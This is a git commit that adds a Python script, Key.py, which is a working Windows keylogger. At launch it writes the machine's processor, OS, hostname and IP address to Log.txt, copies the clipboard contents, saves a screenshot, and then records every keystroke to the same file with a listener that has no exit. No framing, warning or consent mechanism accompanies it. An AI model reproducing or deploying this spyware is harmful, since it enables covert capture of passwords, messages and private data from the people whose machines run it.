daa5e5033272f7fef520e2d73d497e35ab313f84
dhruvvyas25 <82715791+dhruvvyas25@users.noreply.github.com>
2021-07-05 21:16:44 +0530

    Add files via upload

---
+++ Key.py
@@ -0,0 +1,78 @@
+import socket, platform
+import win32clipboard
+import pyautogui
+from pynput.keyboard import Listener
+
+
+def device_information():
+    with open("Log.txt", "a") as f:
+        host = socket.gethostname()
+        IP = socket.gethostbyname(host)
+
+        f.write("Processor: " + platform.processor() + "\n")
+        f.write("System: " + platform.system() + " " + platform.version() + "\n")
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Host Name: " + host + "\n")
+        f.write("IP Address: " + IP + "\n")
+        f.write("\n")
+
+
+device_information()
+
+
+def copy_clipboard():
+    with open("Log.txt", "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + data)
+            f.write("\n")
+            f.write("\n")
+
+        except:
+            f.write("Clipboard could not be copied.")
+            f.write("\n")
+            f.write("\n")
+
+
+copy_clipboard()
+
+
+def screenshot():
+    im = pyautogui.screenshot()
+    im.save(r"D:\D\screenshot.png")
+
+
+screenshot()
+
+
+def on_press(key):
+    keys = str(key).replace("'", "")
+
+    if keys == "Key.space":
+        keys = " "
+    if keys == "Key.enter":
+        keys = "\n"
+    if keys == "Key.backspace":
+        keys = "_"
+    if keys == "Key.shift" or keys == "Key.shift_r" or keys == "Key.ctrl_r" or keys == "Key.ctrl_l" or keys == "Key.caps_lock" or keys == "Key.alt_l" or keys == "Key.alt_gr" or keys == "Key.tab" or keys == "Key.cmd":
+        keys = ""
+
+    print("{0} pressed".format(key))
+
+    with open("Log.txt", "a") as o:
+        o.write(keys)
+
+
+def on_release(key):
+    pass
+
+
+#    if key == key.esc:
+#        return False
+
+
+with Listener(on_press=on_press, on_release=on_release) as l:
+    l.join()
